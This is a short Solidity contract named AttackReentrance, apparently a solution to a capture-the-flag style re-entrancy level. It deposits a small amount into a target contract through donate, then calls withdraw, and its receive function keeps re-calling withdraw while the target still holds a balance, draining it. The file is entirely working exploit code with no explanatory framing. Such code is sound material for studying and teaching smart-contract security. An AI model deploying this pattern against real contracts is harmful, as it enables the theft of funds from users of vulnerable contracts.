// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackReentrance {
    // Address of Re-entrance Smart Contract
    address contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function attack() public {
        // deposite
        contractAddress.call{value: 1000000000000000}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        // withdraw
        contractAddress.call(
            abi.encodeWithSignature("withdraw(uint256)", 1000000000000000)
        );
    }

    receive() external payable {
        if (contractAddress.balance > 0) {
            contractAddress.call(
                abi.encodeWithSignature("withdraw(uint256)", 1000000000000000)
            );
        }
    }
}
